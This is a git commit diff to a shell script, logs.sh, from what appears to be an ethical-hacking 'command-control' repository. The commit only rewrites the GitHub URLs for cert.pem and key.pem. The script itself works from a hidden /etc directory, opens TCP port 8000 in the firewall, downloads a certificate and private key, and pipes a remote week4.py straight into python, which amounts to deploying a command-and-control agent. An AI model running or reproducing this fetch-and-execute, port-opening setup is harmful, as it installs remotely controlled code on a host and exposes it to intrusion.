65c2fb9b2fc4ae6d06cd4f6190a87b03acf17b0f
Nidhi Pabbathi <123031844+npabbathi@users.noreply.github.com>
2026-03-26 20:45:05 -0500

    Change curl URLs to use GitHub raw content
    Updated curl commands to use GitHub raw URLs for cert.pem and key.pem.

--- logs.sh
+++ logs.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 cd /etc/.python-certifications/
 firewall-cmd --add-port=8000/tcp
-curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/cert.pem -o cert.pem
+curl -fsSL --retry 3 https://github.com/AidanNgo/eh-command-control/raw/refs/heads/main/cert.pem -o cert.pem
 
-curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/key.pem -o key.pem
+curl -fsSL --retry 3 https://github.com/AidanNgo/eh-command-control/raw/refs/heads/main/key.pem -o key.pem
   
 curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/week4.py | python
